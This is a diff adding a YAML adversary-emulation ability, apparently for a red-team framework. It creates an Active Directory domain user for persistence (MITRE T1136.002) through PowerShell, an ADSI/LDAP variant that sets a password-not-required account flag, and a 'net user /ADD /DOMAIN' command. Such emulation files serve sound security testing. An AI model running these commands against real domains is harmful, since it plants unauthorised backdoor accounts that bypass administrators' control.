@@ -1,0 +1,42 @@
+id: dc6a04c2-535d-4593-b7e4-ff226a449c67
+name: Create Domain User
+description: Creates a new Domain User using the creds of the Current User
+metadata:
+  version: 1
+  authors:
+    - w0rk3r
+  tags:
+    - destructive
+tactic: persistence
+technique:
+  id: T1136.002
+  name: "Create Account: Domain Account"
+platforms:
+  windows:
+    psh:
+      command: |
+        $SamAccountName = '#{persistence.local.new.user.name}'
+        $AccountPassword = ConvertTo-SecureString '#{persistence.local.new.user.password}' -AsPlainText -Force
+        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+        $User.SamAccountName = $SamAccountName
+        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+        $User.SetPassword($TempCred.GetNetworkCredential().Password)
+        $User.Enabled = $True
+        $User.PasswordNotRequired = $False
+        $User.DisplayName = $SamAccountName
+        $User.Save()
+        $User
+      variants:
+        - command: |
+            $Domain = #{persistence.domain}
+            [ADSI]$DN = "LDAP://CN=Users," + ([ADSI]"LDAP://$Domain").distinguishedName
+            $new = $DN.Create("user","CN=#{persistence.local.new.user.name}")
+            $new.put("samaccountname","#{persistence.local.new.user.name}")
+            $new.setinfo()
+            $new.put("userAccountControl",544)
+            $new.setpassword("#{persistence.local.new.user.password}")
+    cmd:
+      command: |
+        net user #{persistence.local.new.user.name} #{persistence.local.new.user.password} /ADD /DOMAIN
